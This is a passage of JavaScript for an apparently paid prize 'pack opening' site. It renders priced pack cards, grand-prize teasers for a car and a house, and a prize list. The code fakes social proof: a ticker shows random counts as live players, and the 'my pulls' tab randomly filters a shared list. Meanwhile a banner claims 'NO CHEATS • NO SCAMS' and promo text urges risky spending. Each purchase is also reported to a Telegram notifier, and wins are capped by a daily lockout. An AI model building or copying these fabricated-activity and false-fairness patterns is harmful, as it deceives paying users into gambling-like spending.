                cardEl.onclick = () => showCardModal(card);
                const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
                
                // Use real image if available
                const imageStyle = card.image 
                    ? `background-image: url('${card.image}'); background-size: cover; background-position: center;`
                    : `background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);`;
                
                cardEl.innerHTML = `
                    <div class="card-badges">
                        ${(card.badges || ['Holographic', '1x available']).map(b => `<span class="badge">${b}</span>`).join('')}
                    </div>
                    <div class="card-image" style="${imageStyle}">
                        ${!card.image ? '<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 32px; opacity: 0.3;">âš¡</div>' : ''}
                    </div>
                    <div class="card-name">${card.name}</div>
                    <div class="card-price">${card.price}</div>
                    <div class="card-rarity">${card.rarity || 'Rare'} â€¢ HP ${card.hp || 'N/A'}</div>
                `;
                container.appendChild(cardEl);
            });
        }

        function _grandOpeningBanner() {
            const b = document.createElement('div');
            b.className = 'grand-opening';
            b.style.cssText = `
                grid-column:1/-1;background:linear-gradient(135deg,#0a0a0a,#1a0a00,#0a0a0a);
                border:2px solid #ffd700;box-shadow:0 0 30px rgba(255,215,0,0.4);
                border-radius:4px;padding:18px 14px;text-align:center;margin-bottom:4px;
                font-family:'Press Start 2P',monospace;
            `;
            b.innerHTML = `
                <div style="font-size:13px;color:#ffd700;letter-spacing:3px;margin-bottom:8px;">ðŸŽ‰ GRAND OPENING ðŸŽ‰</div>
                <div style="font-size:7px;color:#fff;letter-spacing:1px;margin-bottom:10px;">FEB 20, 2026 â€” MAR 2, 2026</div>
                <div style="background:#111;border:1px solid #ffd70066;padding:10px 8px;border-radius:2px;margin-bottom:10px;">
                    <div style="font-size:7px;color:#00ff00;margin-bottom:6px;">âœ… NO CHEATS &nbsp;â€¢&nbsp; NO SCAMS &nbsp;â€¢&nbsp; NO BS</div>
                    <div style="font-size:6px;color:#ccc;line-height:2.2;">
                        Didn't like what you pulled? <span style="color:#ffd700;">We'll fix it.</span><br>
                        <span style="color:#00ff00;font-size:7px;">No weird policies. No runaround.</span><br>
                        3 packs in and nothing? Hit support â€” we sort you out. Simple.
                    </div>
                </div>
                <div style="font-size:6px;color:#ffd700;animation:pulse 1.5s ease infinite;">âš¡ GRAND OPENING â€” STACKED ODDS â€” RUN IT BACK âš¡</div>
                <div style="font-size:5px;color:#555;margin-top:8px;letter-spacing:1px;">Built by real players. No bot odds. â€” NBTNate</div>
            `;
            return b;
        }

        let liveEnergyTimer = null;
        let liveEnergyValue = null;
        function _liveEnergyBar() {
            const bar = document.createElement('div');
            bar.className = 'live-energy';
            bar.innerHTML = `
                <span class="dot"></span>
                <span class="live-energy-text">23 players opening now</span>
            `;
            return bar;
        }

        function startLiveEnergyTicker() {
            const nodes = document.querySelectorAll('.live-energy-text');
            if (!nodes.length) return;
            const templates = [
                (n) => `${n} players opening now`,
                (n) => `${n} packs ripped in the last 10 min`,
                (n) => `${n} live pulls happening`,
                (n) => `Live drops: ${n} just hit`
            ];
            const clamp = (v, min, max) => Math.max(min, Math.min(max, v));
            const update = () => {
                const delta = Math.floor(Math.random() * 7) - 3; // -3..3
                liveEnergyValue = liveEnergyValue == null
                    ? Math.floor(Math.random() * 18) + 18
                    : clamp(liveEnergyValue + delta, 12, 46);
                const template = templates[Math.floor(Math.random() * templates.length)];
                nodes.forEach(node => { animateLiveCounter(node, liveEnergyValue, template); });
                const nextDelay = 10000 + Math.floor(Math.random() * 10000);
                liveEnergyTimer = setTimeout(update, nextDelay);
            };
            if (liveEnergyTimer) clearTimeout(liveEnergyTimer);
            update();
        }

        // Per-pack personality: tilt, glow strength, button shape, animation, vertical stagger
        const PACK_PERSONALITY = [
            { tilt: '0deg',   glowMult: 1.4, btnRadius: '5px',  btnAnim: 'btnPulse 2s ease infinite',    featured: true,  nudge: '0px'   }, // Mega Million â€” FEATURED + strong glow
            { tilt: '2deg',   glowMult: 0.6, btnRadius: '20px', btnAnim: 'none',                          featured: false, nudge: '14px'  }, // Gold Fish â€” tilted, nudged down
            { tilt: '-1.5deg',glowMult: 0.85,btnRadius: '3px',  btnAnim: 'btnWiggle 3s ease infinite',    featured: false, nudge: '-8px'  }, // Sprinkle Poney â€” nudged up
            { tilt: '0deg',   glowMult: 1.2, btnRadius: '2px',  btnAnim: 'btnBolt 1.8s ease infinite',    featured: false, nudge: '10px'  }, // Thunder Vault
            { tilt: '1deg',   glowMult: 0.75,btnRadius: '12px', btnAnim: 'none',                          featured: false, nudge: '-5px'  }, // Cosmic Drift
            { tilt: '0deg',   glowMult: 0.5, btnRadius: '0px',  btnAnim: 'none',                          featured: false, nudge: '18px'  }, // Shadow Loot â€” lowest glow, nudged down most
            { tilt: '-1deg',  glowMult: 1.0, btnRadius: '8px',  btnAnim: 'btnShine 2.5s ease infinite',   featured: false, nudge: '-10px' }, // Diamond Surge â€” nudged up
            { tilt: '1.5deg', glowMult: 1.3, btnRadius: '4px',  btnAnim: 'btnFlicker 1.5s ease infinite', featured: false, nudge: '6px'   }, // Neon Blaze
        ];

        function _buildPackCard(pack, index) {
            const p = PACK_PERSONALITY[index] || { tilt:'0deg', glowMult:1, btnRadius:'5px', btnAnim:'none', featured:false };
            const isFeatured = p.featured;
            const glowSize = Math.round(20 * p.glowMult);
            const baseGlow = Math.max(5, Math.round(glowSize * 0.6));
            const hoverGlow = Math.max(14, Math.round(glowSize * 1.8));
            const card = document.createElement('div');
            card.className = 'pack-card';
            if (isFeatured) card.classList.add('is-featured');

            const borderW = isFeatured ? '3px' : index % 3 === 0 ? '2px' : '1.5px';
            card.style.cssText = `
                background:linear-gradient(${155+index*8}deg,${pack.c1},${pack.c2}${isFeatured?'40':'28'},${pack.c1});
                border:${borderW} solid ${pack.c2};
                box-shadow:0 0 ${baseGlow}px ${pack.c2}26, inset 0 0 40px rgba(0,0,0,0.35), inset 0 12px 18px rgba(0,0,0,0.35);
                cursor:pointer;padding:${isFeatured?'28px 22px 20px':'24px 18px 18px'};
                display:flex;flex-direction:column;align-items:center;gap:10px;
                border-radius:${isFeatured?'14px': [10,12,8,10,14,6,10,9][index]+'px'};
                animation:packCardIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both;
                animation-delay:${index*0.1}s;overflow:hidden;position:relative;
                ${isFeatured ? 'z-index:2;' : ''}
            `;
            card.style.setProperty('--pack-tilt', p.tilt);
            card.style.setProperty('--pack-nudge', p.nudge || '0px');
            card.style.setProperty('--pack-hover-lift', isFeatured ? '-16px' : '-11px');
            card.style.setProperty('--pack-hover-scale', isFeatured ? '1.04' : '1.03');

            card.addEventListener('animationend', (e) => {
                if (e.animationName !== 'packCardIn') return;
                card.style.animation = `packFloat ${5.6 + index * 0.25}s ease-in-out infinite`;
                card.style.animationDelay = `${index * 0.2}s`;
            });

            // Grain texture overlay
            card.innerHTML = `<div style="position:absolute;inset:0;opacity:0.04;pointer-events:none;
                background-image:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22><filter id=%22n%22><feTurbulence type=%22fractalNoise%22 baseFrequency=%220.9%22 numOctaves=%224%22 stitchTiles=%22stitch%22/></filter><rect width=%22200%22 height=%22200%22 filter=%22url(%23n)%22 opacity=%221%22/></svg>');
                border-radius:inherit;"></div>`;

            // Featured badge + shimmer sweep
            if (isFeatured) {
                card.innerHTML += `<div style="position:absolute;top:10px;left:-1px;background:${pack.c2};color:#000;font-family:'Press Start 2P',monospace;font-size:5px;padding:4px 10px;border-radius:0 4px 4px 0;font-weight:bold;letter-spacing:1px;">â­ FEATURED</div>`;
                card.innerHTML += `<div style="position:absolute;inset:0;pointer-events:none;border-radius:inherit;overflow:hidden;">
                    <div style="position:absolute;top:0;left:-100%;width:60%;height:100%;
                        background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.07) 50%,transparent 60%);
                        animation:featuredShimmer 5s ease-in-out infinite;"></div>
                </div>`;
            }

            // Corner glow â€” slightly offset per card for asymmetry
            const glowOffsetX = [-40, -20, -50, -35, -45, -30, -40, -25][index] || -40;
            const glowOffsetY = [-40, -50, -30, -45, -40, -35, -20, -45][index] || -40;
            card.innerHTML += `<div style="position:absolute;top:${glowOffsetY}px;right:${glowOffsetX}px;width:${80+index*8}px;height:${80+index*8}px;background:radial-gradient(circle,${pack.c2}${isFeatured?'66':'44'},transparent 70%);pointer-events:none;border-radius:50%;"></div>`;

            card.onmouseenter = () => {
                card.style.boxShadow = `0 ${isFeatured?22:16}px ${isFeatured?54:38}px rgba(0,0,0,0.65), 0 0 ${hoverGlow}px ${pack.c2}cc, inset 0 0 34px rgba(0,0,0,0.28), inset 0 12px 18px rgba(0,0,0,0.32)`;
            };
            card.onmouseleave = () => {
                card.style.boxShadow = `0 0 ${baseGlow}px ${pack.c2}26, inset 0 0 40px rgba(0,0,0,0.35), inset 0 12px 18px rgba(0,0,0,0.35)`;
            };

            const tickerText = pack.promo.join('  â€¢  ');
            const imgSize = isFeatured ? 145 : 130;
            const btnText = ['OPEN PACK','LET\'S GO','SPIN IT','CHARGE UP','LAUNCH','GO DARK','SURGE','BLAZE IT'][index] || 'OPEN PACK';

            card.innerHTML += `
                <img src="${pack.img}" style="width:${imgSize}px;height:${imgSize}px;object-fit:contain;filter:drop-shadow(0 0 ${isFeatured?22:16}px ${pack.c2});animation:imgFloat ${3.5+index*0.3}s ease-in-out infinite;animation-delay:${index*0.25}s;margin-top:${isFeatured?8:0}px;" loading="lazy" decoding="async">
                <div style="font-size:${isFeatured?11:10}px;color:${pack.tc};font-weight:bold;text-align:center;letter-spacing:1px;line-height:1.7;text-shadow:0 0 12px ${pack.c2}88;">${pack.name}</div>
                <div style="font-size:6px;color:${pack.c2};letter-spacing:${0.8+index*0.1}px;opacity:${0.7+index*0.04};">${pack.desc}</div>
                <div style="width:100%;background:rgba(0,0,0,0.6);border:1px solid ${pack.c2}33;border-radius:3px;padding:5px 0;overflow:hidden;">
                    <div style="white-space:nowrap;display:inline-block;animation:promoScroll ${14+index*0.8}s linear infinite;font-size:5px;color:${pack.tc}cc;letter-spacing:1px;padding-left:100%;">
                        ${tickerText} &nbsp;&nbsp;&nbsp;&nbsp; ${tickerText}
                    </div>
                </div>
                <div style="font-size:${isFeatured?26:24}px;color:#fff;font-weight:900;letter-spacing:0.5px;text-shadow:0 0 18px ${pack.c2};">$${pack.price}.00</div>
                <button onclick="buyCustomPack(${index},event)" style="
                    background:linear-gradient(${135+index*15}deg,${pack.c2},${pack.c2}cc);
                    color:#000;border:none;padding:${12+index%3}px 0;
                    font-family:'Press Start 2P',monospace;font-size:${isFeatured?9:8}px;cursor:pointer;
                    width:100%;border-radius:${p.btnRadius};font-weight:bold;letter-spacing:${1+index%2}px;
                    box-shadow:0 5px 20px ${pack.c2}88;
                    animation:${p.btnAnim};
                    transition:transform 0.1s,filter 0.1s;
                " onmousedown="this.style.transform='scale(0.95)'" onmouseup="this.style.transform=''"
                   ontouchstart="this.style.transform='scale(0.95)'" ontouchend="this.style.transform=''">${btnText}</button>
            `;
            return card;
        }

        // â”€â”€ Coming Soon Packs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const COMING_SOON_PACKS = [
            // â”€â”€ Grand Prize Packs â”€â”€
            { name: 'Dream Wheels Pack',   emoji: 'ðŸš—', c1:'#0a0a00', c2:'#ff2200', prize: 'WIN A CAR',         desc: 'LUXURY GRAND PRIZE',    hint: 'One lucky winner drives home in style. Real car. Real keys.' },
            { name: 'Dream Home Pack',     emoji: 'ðŸ ', c1:'#000a05', c2:'#00ff88', prize: 'WIN HOUSE KEYS',     desc: 'REAL ESTATE GRAND PRIZE',hint: 'Keys to a new home â€” fully covered. Own it outright.' },
            { name: 'Global Escape Pack',  emoji: 'âœˆï¸', c1:'#00001a', c2:'#00ccff', prize: 'FULLY PAID TRIP',    desc: 'ALL EXPENSES COVERED',   hint: 'Hotels â€¢ Flights â€¢ Food â€¢ Transport â€” everything paid for you.' },
            { name: '??? TOP SECRET ???',  emoji: 'ðŸ”’', c1:'#050505', c2:'#ff0000', prize: '??? CLASSIFIED ???', desc: 'TOP SECRET',             hint: 'We can\'t tell you what\'s inside. But it\'s big. Very big.' },
            // â”€â”€ 30 More â”€â”€
            { name: 'Crystal Fortune Pack',emoji: 'ðŸ”®', c1:'#100020', c2:'#dd88ff', prize: '???', desc: 'COMING SOON', hint: 'Pure crystal energy. Legendary drops incoming.' },
            { name: 'Dark Matter Pack',    emoji: 'ðŸŒ‘', c1:'#000005', c2:'#4444ff', prize: '???', desc: 'COMING SOON', hint: 'What lurks in the void? Something enormous.' },
            { name: 'Inferno Pack',        emoji: 'ðŸŒ‹', c1:'#1a0000', c2:'#ff6600', prize: '???', desc: 'COMING SOON', hint: 'Born from the heat. Only the bold survive.' },
            { name: 'Arctic Frost Pack',   emoji: 'â„ï¸', c1:'#000d1a', c2:'#aaddff', prize: '???', desc: 'COMING SOON', hint: 'Cold-blooded prizes. Ice cold wins.' },
            { name: 'Solar Flare Pack',    emoji: 'â˜€ï¸', c1:'#1a0a00', c2:'#ffaa00', prize: '???', desc: 'COMING SOON', hint: 'Powered by the sun. Explosive rewards.' },
            { name: 'Lunar Eclipse Pack',  emoji: 'ðŸŒ•', c1:'#05050f', c2:'#9966ff', prize: '???', desc: 'COMING SOON', hint: 'Once in a lifetime alignment. Rare drops.' },
            { name: 'Storm Surge Pack',    emoji: 'â›ˆï¸', c1:'#001020', c2:'#00aaff', prize: '???', desc: 'COMING SOON', hint: 'The storm is coming. Are you ready?' },
            { name: 'Phantom Pack',        emoji: 'ðŸ‘»', c1:'#080808', c2:'#cccccc', prize: '???', desc: 'COMING SOON', hint: 'Now you see it, now you don\'t. Ghostly wins.' },
            { name: 'Venom Pack',          emoji: 'ðŸ', c1:'#001a00', c2:'#44ff44', prize: '???', desc: 'COMING SOON', hint: 'Lethal odds. Toxic rewards. Deadly prizes.' },
            { name: 'Titan Pack',          emoji: 'âš™ï¸', c1:'#0f0f0f', c2:'#888888', prize: '???', desc: 'COMING SOON', hint: 'Built different. Engineered to win big.' },
            { name: 'Nova Pack',           emoji: 'ðŸ’¥', c1:'#0a000a', c2:'#ff44ff', prize: '???', desc: 'COMING SOON', hint: 'A star being born. Explosive energy inside.' },
            { name: 'Galaxy Brain Pack',   emoji: 'ðŸ§ ', c1:'#050015', c2:'#7766ff', prize: '???', desc: 'COMING SOON', hint: 'For big thinkers. Bigger prize pool.' },
            { name: 'Obsidian Pack',       emoji: 'ðŸ–¤', c1:'#050505', c2:'#555555', prize: '???', desc: 'COMING SOON', hint: 'Forged in darkness. Razor sharp value.' },
            { name: 'Emerald Rush Pack',   emoji: 'ðŸ’š', c1:'#001a05', c2:'#00cc66', prize: '???', desc: 'COMING SOON', hint: 'Green means go. Rush the pack before it\'s gone.' },
            { name: 'Sapphire Storm Pack', emoji: 'ðŸ’Ž', c1:'#000a1a', c2:'#0066ff', prize: '???', desc: 'COMING SOON', hint: 'Rare as sapphire. Wins as precious as gems.' },
            { name: 'Ruby Rage Pack',      emoji: 'â¤ï¸', c1:'#1a0000', c2:'#cc0000', prize: '???', desc: 'COMING SOON', hint: 'Fueled by passion. Burning hot prizes.' },
            { name: 'Platinum Pack',       emoji: 'â¬œ', c1:'#0d0d0d', c2:'#dddddd', prize: '???', desc: 'COMING SOON', hint: 'Above gold. Above everything. Pure platinum.' },
            { name: 'Titanium Pack',       emoji: 'ðŸ›¡ï¸', c1:'#0a0a0a', c2:'#99aaaa', prize: '???', desc: 'COMING SOON', hint: 'Unbreakable. Unstoppable. Unbelievable.' },
            { name: 'Black Hole Pack',     emoji: 'ðŸ•³ï¸', c1:'#000000', c2:'#330066', prize: '???', desc: 'COMING SOON', hint: 'Everything gets sucked in. Including the jackpot.' },
            { name: 'Supernova Pack',      emoji: 'ðŸŒŸ', c1:'#0a0005', c2:'#ffdd00', prize: '???', desc: 'COMING SOON', hint: 'The biggest explosion in the universe. Period.' },
            { name: 'Midnight Pack',       emoji: 'ðŸŒƒ', c1:'#000015', c2:'#3344ff', prize: '???', desc: 'COMING SOON', hint: 'When the city sleeps, the winners wake up.' },
            { name: 'Crimson Pack',        emoji: 'ðŸ”´', c1:'#150000', c2:'#ff1133', prize: '???', desc: 'COMING SOON', hint: 'Drenched in red. The color of winners.' },
            { name: 'Jade Pack',           emoji: 'ðŸŒ¿', c1:'#001a08', c2:'#33cc88', prize: '???', desc: 'COMING SOON', hint: 'Ancient luck. Modern payouts.' },
            { name: 'Amber Rush Pack',     emoji: 'ðŸŸ ', c1:'#150800', c2:'#ffaa33', prize: '???', desc: 'COMING SOON', hint: 'Trapped inside: your next big win.' },
            { name: 'Turquoise Pack',      emoji: 'ðŸ”µ', c1:'#001515', c2:'#00ddcc', prize: '???', desc: 'COMING SOON', hint: 'Clear as water. Deep as the ocean.' },
            { name: 'Indigo Pack',         emoji: 'ðŸŸ£', c1:'#05000a', c2:'#5533cc', prize: '???', desc: 'COMING SOON', hint: 'Between blue and violet lives the jackpot.' },
            { name: 'Scarlet Pack',        emoji: 'ðŸ”¥', c1:'#100000', c2:'#ff2200', prize: '???', desc: 'COMING SOON', hint: 'Scarlet letter W. W for Winner.' },
            { name: 'Bronze Age Pack',     emoji: 'ðŸ¥‰', c1:'#0a0500', c2:'#cc8844', prize: '???', desc: 'COMING SOON', hint: 'Old school meets new money. Timeless drops.' },
            { name: 'Silver Lining Pack',  emoji: 'ðŸŒ¥ï¸', c1:'#0a0a0a', c2:'#bbbbbb', prize: '???', desc: 'COMING SOON', hint: 'Every cloud has one. This pack is it.' },
            { name: 'Aurora Pack',         emoji: 'ðŸŒˆ', c1:'#000a15', c2:'#00ffcc', prize: '???', desc: 'COMING SOON', hint: 'Northern lights, southern wins. Magic inside.' },
            { name: 'Phantom Ace Pack',    emoji: 'ðŸƒ', c1:'#050005', c2:'#ff66aa', prize: '???', desc: 'COMING SOON', hint: 'The wild card. Nobody knows what you\'ll get.' },
        ];

        function _buildComingSoonCard(pack, index) {
            const isTopSecret = pack.name.includes('TOP SECRET');
            const isGrandPrize = ['Dream Wheels Pack','Dream Home Pack','Global Escape Pack'].includes(pack.name);
            const borderColor = isTopSecret ? '#ff0000' : isGrandPrize ? pack.c2 : '#333';
            const opacity = isTopSecret || isGrandPrize ? '1' : '0.75';

            const card = document.createElement('div');
            card.className = 'pack-card coming-soon-card';
            card.style.cssText = `
                background:linear-gradient(160deg,${pack.c1},${pack.c2}18,${pack.c1});
                border:2px solid ${borderColor};
                box-shadow:0 0 ${isGrandPrize||isTopSecret?'20px':'8px'} ${borderColor}55;
                padding:20px 14px 16px;
                display:flex;flex-direction:column;align-items:center;gap:8px;
                border-radius:10px;opacity:${opacity};
                animation:packCardIn 0.5s ease both;animation-delay:${index*0.04}s;
                position:relative;overflow:hidden;cursor:default;
            `;
            card.style.setProperty('--pack-tilt', '0deg');
            card.style.setProperty('--pack-nudge', '0px');
            card.style.setProperty('--pack-hover-scale', '1');

            const glowPulse = isGrandPrize || isTopSecret
                ? `animation:pulse 2s ease infinite;animation-delay:${index*0.3}s;`
                : '';

            card.innerHTML = `
                <div style="position:absolute;top:8px;right:8px;background:${isTopSecret?'#ff0000':isGrandPrize?pack.c2:'#333'};color:#000;font-family:'Press Start 2P',monospace;font-size:5px;padding:3px 7px;border-radius:2px;font-weight:bold;${glowPulse}">
                    ${isTopSecret ? 'ðŸ”’ TOP SECRET' : isGrandPrize ? 'â­ GRAND PRIZE' : 'COMING SOON'}
                </div>
                <img src="https://i.postimg.cc/pX08nt7M/coming-soon-funny-cartoon-workers-600nw-524317576-removebg-preview.png" style="width:90px;height:90px;object-fit:contain;margin-top:10px;filter:${isTopSecret?'blur(4px)':'none'};" loading="lazy">
                <div style="font-size:9px;color:${isGrandPrize||isTopSecret?pack.c2:'#666'};font-weight:bold;text-align:center;letter-spacing:1px;line-height:1.6;">${pack.name}</div>
                <div style="font-size:6px;color:${isGrandPrize||isTopSecret?pack.c2+'aa':'#444'};letter-spacing:2px;">${pack.desc}</div>
                ${isGrandPrize || isTopSecret ? `
                    <div style="background:rgba(0,0,0,0.7);border:1px solid ${pack.c2}44;padding:8px;border-radius:4px;width:100%;text-align:center;">
                        <div style="font-size:8px;color:${pack.c2};font-weight:bold;margin-bottom:4px;">${pack.prize}</div>
                        <div style="font-size:5px;color:#aaa;line-height:1.8;">${pack.hint}</div>
                    </div>
                ` : `
                    <div style="font-size:5px;color:#555;text-align:center;line-height:1.8;padding:4px 0;">${pack.hint}</div>
                `}
                <div style="background:#111;border:1px solid #222;padding:10px 0;width:100%;text-align:center;border-radius:4px;margin-top:4px;">
                    <span style="font-family:'Press Start 2P',monospace;font-size:7px;color:#444;">ðŸ”’ NOT YET AVAILABLE</span>
                </div>
            `;
            return card;
        }

        function _comingSoonSection() {
            const section = document.createElement('div');
            section.style.cssText = 'grid-column:1/-1;text-align:center;padding:30px 0 10px;';
            section.innerHTML = `
                <div style="display:inline-block;background:#0a0a0a;border:1px solid #222;padding:10px 24px;font-family:'Press Start 2P',monospace;font-size:9px;color:#444;letter-spacing:3px;">
                    â”â”â” COMING SOON â”â”â”
                </div>
                <div style="font-size:6px;color:#333;margin-top:8px;font-family:'Press Start 2P',monospace;">More packs dropping soon. Stay tuned.</div>
            `;
            return section;
        }

        function generatePacks() {
            const container = document.getElementById('packsGrid');
            if (!container) return;
            container.innerHTML = '';
            container.appendChild(_grandOpeningBanner());
            container.appendChild(_liveEnergyBar());
            const scroller = document.createElement('div');
            scroller.className = 'packs-scroller';
            CUSTOM_PACKS.forEach((pack, i) => scroller.appendChild(_buildPackCard(pack, i)));
            container.appendChild(scroller);
            container.appendChild(_comingSoonSection());
            const comingScroller = document.createElement('div');
            comingScroller.className = 'packs-scroller';
            COMING_SOON_PACKS.forEach((pack, i) => comingScroller.appendChild(_buildComingSoonCard(pack, i)));
            container.appendChild(comingScroller);
            startLiveEnergyTicker();
        }

        const CUSTOM_PACKS = [
            { name: 'Mega Million Pack',  price: 75,  img: 'https://i.postimg.cc/sXSCKRR0/Screenshot-2026-02-20-163404-removebg-preview.png',  c1:'#3a2000', c2:'#ffd700', tc:'#ffd700', desc:'JACKPOT TIER',
              promo: ['Big swings. Not for safe players.', 'You chase this one.', 'Go big or go home.', 'This is the jackpot lane.'] },
            { name: 'Gold Fish Pack',     price: 15,  img: 'https://i.postimg.cc/Y0Y24W9j/OIP-16-removebg-preview.png',                          c1:'#001530', c2:'#00ccff', tc:'#00ccff', desc:'AQUA VIBES',
              promo: ['Cheap and sneaky.', 'Small buy, surprise hits.', 'Most people sleep on it.', 'Quiet wins.'] },
            { name: 'Sprinkle Poney Pack',price: 10,  img: 'https://i.postimg.cc/26nghF49/OIP-17-removebg-preview.png',                          c1:'#250030', c2:'#ff55cc', tc:'#ff88dd', desc:'DREAM MAGIC',
              promo: ['Cute name, hard hits.', 'Magic when it shows up.', 'Low price, wild pulls.', 'Don\'t underestimate it.'] },
            { name: 'Thunder Vault Pack', price: 25,  img: 'https://i.postimg.cc/153Y3ZYC/OIP-18-removebg-preview.png',                          c1:'#001500', c2:'#00ff88', tc:'#00ff88', desc:'ELECTRIC CHARGE',
              promo: ['High voltage pulls.', 'If it hits, it hits.', 'Risk it for the spark.', 'Fast shocks.'] },
            { name: 'Cosmic Drift Pack',  price: 35,  img: 'https://i.postimg.cc/HsnBC9r1/2a4c3fb9a6e5769cbdb55264547900ad-removebg-preview.png', c1:'#080020', c2:'#cc44ff', tc:'#cc44ff', desc:'GALAXY TIER',
              promo: ['Slow burn, big upside.', 'Space money vibes.', 'Patience pays here.', 'Deep pulls only.'] },
            { name: 'Shadow Loot Pack',   price: 20,  img: 'https://i.postimg.cc/W34JJXLP/imgbin-shadow-the-hedgehog-sonic-the-hedgehog-art-sonic-universe-shadow-the-hedgehog-lancelot-Xsi-ZM.png', c1:'#060606', c2:'#555555', tc:'#aaaaaa', desc:'DARK MYSTERY',
              promo: ['Low-key but dangerous.', 'Silent wins.', 'Dark horse pick.', 'For the grinders.'] },
            { name: 'Diamond Surge Pack', price: 50,  img: 'https://i.postimg.cc/RCNPHzBF/smiling-diamond-character-with-crown-cartoon-vector-removebg-preview.png', c1:'#001525', c2:'#88ddff', tc:'#88ddff', desc:'CRYSTAL ELITE',
              promo: ['Steady power.', 'Quality over chaos.', 'Built for long runs.', 'Clean wins.'] },
            { name: 'Neon Blaze Pack',    price: 30,  img: 'https://i.postimg.cc/JzmcKf95/flaming-hot-boy-with-fiery-rage-cartoon-vector-illustration-1080480-100355-removebg-preview.png', c1:'#180000', c2:'#ff4400', tc:'#ff6622', desc:'BLAZE EDITION',
              promo: ['Hot streak pack.', 'Flashes hard.', 'Either pops or doesn\'t.', 'No middle ground.'] },
        ];

        function generateStorePacks() {
            const container = document.getElementById('storePacks');
            if (!container) return;
            container.innerHTML = '';
            container.appendChild(_grandOpeningBanner());
            container.appendChild(_liveEnergyBar());
            const scroller = document.createElement('div');
            scroller.className = 'packs-scroller';
            CUSTOM_PACKS.forEach((pack, i) => scroller.appendChild(_buildPackCard(pack, i)));
            container.appendChild(scroller);
            container.appendChild(_comingSoonSection());
            const comingScroller = document.createElement('div');
            comingScroller.className = 'packs-scroller';
            COMING_SOON_PACKS.forEach((pack, i) => comingScroller.appendChild(_buildComingSoonCard(pack, i)));
            container.appendChild(comingScroller);
            startLiveEnergyTicker();
        }

        function buyCustomPack(idx, event) {
            if (event) { event.stopPropagation(); event.preventDefault(); }
            const cardEl = event && event.target ? event.target.closest('.pack-card') : null;
            if (cardEl) {
                cardEl.classList.remove('spark');
                void cardEl.offsetWidth; // restart animation
                cardEl.classList.add('spark');
            }

            // Hard login wall â€” check both memory AND localStorage
            const storedUser = JSON.parse(localStorage.getItem('currentUser') || 'null');
            if (!currentUser || !storedUser) {
                currentUser = null;
                localStorage.removeItem('currentUser');
                showLoginModal();
                showNotification('Please log in to open packs.', 'error');
                return;
            }
            // Verify account actually exists in the users store
            const allUsers = getUsers();
            const verified = allUsers.find(u => u.email === storedUser.email && u.username === storedUser.username);
            if (!verified) {
                currentUser = null;
                localStorage.removeItem('currentUser');
                showLoginModal();
                showNotification('Account not found. Please log in.', 'error');
                return;
            }

            // Check daily win lockout
            if (isLockedOut(currentUser.username)) {
                showDailyLimitPopup();
                return;
            }
            const pack = CUSTOM_PACKS[idx];
            const bal = getBalance(currentUser.username);
            if (bal <= 0 || bal < pack.price) {
                showNotification(`Need $${pack.price.toFixed(2)} â€” you have $${bal.toFixed(2)}. Add funds first!`, 'error');
                showWalletModal();
                return;
            }
            deductBalance(currentUser.username, pack.price);
            updateBalanceDisplay();
            currentUser.packsOpened = (currentUser.packsOpened || 0) + 1;
            const users = getUsers();
            const uIdx = users.findIndex(u => u.username === currentUser.username);
            if (uIdx !== -1) { users[uIdx].packsOpened = currentUser.packsOpened; _setStore('pluxo_users', users); }
            tgNotify(`ðŸŽ¡ <b>Wheel Spin</b>\nðŸ‘¤ User: <b>${currentUser.username}</b>\nðŸ“¦ Pack: ${pack.name}\nðŸ’° Cost: $${pack.price}\nðŸ’³ Remaining: $${getBalance(currentUser.username).toFixed(2)}\nðŸ•’ ${new Date().toLocaleString()}`);
            openSpinModal(pack.price, 1, pack.img, pack.name);
        }

        function generateRecentPulls(tab = 'global') {
            const container = document.getElementById('recentPullsList');
            if (!container) return;
            container.innerHTML = '';
            
            const pulls = tab === 'my' ? recentPulls.filter(() => Math.random() > 0.7) : recentPulls;
            
            pulls.slice(0, 10).forEach((pull, index) => {
                const pullEl = document.createElement('div');
                pullEl.className = 'recent-pull-item';
                pullEl.style.animationDelay = `${index * 0.05}s`;
                const randomColor = `hsl(${Math.random() * 360}, 50%, 40%)`;
                pullEl.innerHTML = `
                    <div class="recent-pull-images">
                        <div class="recent-pull-image" style="background: linear-gradient(135deg, ${randomColor} 0%, ${randomColor}dd 100%);"></div>
                        <div class="recent-pull-image" style="background: linear-gradient(135deg, ${randomColor}88 0%, ${randomColor} 100%);"></div>
                        <div class="recent-pull-image" style="background: linear-gradient(135deg, ${randomColor}44 0%, ${randomColor}aa 100%);"></div>
                    </div>
                    <div class="recent-pull-info">
                        <div>${pull.name}</div>
                        <div class="recent-pull-price">${pull.value || '$0.00'}</div>
                    </div>
                    <div class="recent-pull-time">${pull.time}</div>
                `;
                container.appendChild(pullEl);
            });
        }

        const CASH_IMG   = 'https://i.postimg.cc/NjBHrkcg/R-(2).png';
        const PRIZE_DATA = [
            {
                name: 'PS5',
                label: 'Sony PlayStation 5',
                value: '$499',
                cashValue: '$499',
                img: 'https://i.postimg.cc/W4yXsHJw/ca2fe3dd877341aebb80119a785d956a-source.webp',
                outOfStock: false
            },
            {
                name: 'iPhone 17 Pro Max',
                label: 'Apple iPhone 17 Pro Max',
                value: '$1,199',
                cashValue: '$1,199',
                img: 'https://i.postimg.cc/sDKLtKwf/e37a88ad2f004b5abce00aa7de58ae89-source.webp',
                outOfStock: false
            },
            {
                name: 'Gaming PC',
                label: 'Custom High-End Gaming PC',
                value: '$2,500',
                cashValue: '$2,500',
                img: null,
                outOfStock: true
            },
            {
                name: '$10,000 Cash',
                label: 'Ten Thousand Dollars',
                value: '$10,000',
                cashValue: '$10,000',
                img: CASH_IMG,
                outOfStock: false
            },
            {
                name: 'Rolex',
                label: 'Rolex Submariner Watch',
                value: '$26,000',
                cashValue: '$26,000',
                img: 'https://i.postimg.cc/c1FMWjyK/d302131af6fb44aebbd372dd18f5c7f7-source.webp',
                outOfStock: false
            },
